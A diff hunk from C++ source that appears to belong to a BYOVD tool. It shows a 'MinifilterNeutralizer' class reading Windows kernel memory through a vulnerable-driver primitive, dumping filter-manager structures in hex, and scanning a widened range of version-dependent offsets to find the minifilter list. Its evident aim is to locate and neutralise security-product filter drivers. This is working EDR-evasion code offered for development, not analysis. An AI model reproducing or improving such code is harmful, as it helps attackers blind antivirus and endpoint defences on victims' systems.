@@ -3128,9 +3128,31 @@ uint64_t MinifilterNeutralizer::FindFilterByName(uint64_t fltmgrBase, uint64_t f
         return 0;
     }
 
-    // FLTP_FRAME.FilterList 偏移因 Windows 版本而异 (Win10 21H2:0x140, 22H2:0x158, Win11:0x168)
-    // BUILD 464: 尝试更宽的范围, 包括 Win10 22H2+ 和 Win11 的偏移
-    uint64_t filterOffsets[] = { 0x140, 0x148, 0x150, 0x138, 0x158, 0x160, 0x168, 0x170, 0x178, 0x180 };
+    // BUILD 465: dump FltGlobals + FrameList hex 诊断
+    ByovdDiag("FLT:NTRL: FltGlobals hex: ");
+    for (int i = 0; i < 4; i++) {
+        uint64_t qw = 0;
+        kma.ReadKernelVA(fltGlobals + i*8, &qw, 8);
+        ByovdDiag("%016llX ", (unsigned long long)qw);
+    }
+    ByovdDiag("\n");
+    ByovdDiag("FLT:NTRL: FrameList at 0x%llX hex: ", (unsigned long long)frameList);
+    for (int i = 0; i < 8; i++) {
+        uint64_t qw = 0;
+        kma.ReadKernelVA(frameList + i*8, &qw, 8);
+        ByovdDiag("%016llX ", (unsigned long long)qw);
+    }
+    ByovdDiag("\n");
+
+    // FLTP_FRAME.FilterList 偏移因 Windows 版本而异
+    // BUILD 465: 扩展扫描 FrameList 地址 0x100-0x400 全范围
+    uint64_t filterOffsets[] = { 
+        0x138, 0x140, 0x148, 0x150, 0x158, 0x160, 0x168, 0x170, 0x178, 0x180,
+        0x188, 0x190, 0x198, 0x1A0, 0x1A8, 0x1B0, 0x1B8, 0x1C0, 0x1C8, 0x1D0,
+        0x1D8, 0x1E0, 0x1E8, 0x1F0, 0x1F8, 0x200, 0x208, 0x210, 0x218, 0x220,
+        0x228, 0x230, 0x238, 0x240, 0x248, 0x250, 0x258, 0x260, 0x268, 0x270,
+        0x278, 0x280, 0x288, 0x290, 0x298, 0x2A0, 0x2A8, 0x2B0, 0x2B8, 0x2C0,
+    };
     uint64_t filterListHead = 0;
 
     for (uint64_t off : filterOffsets) {
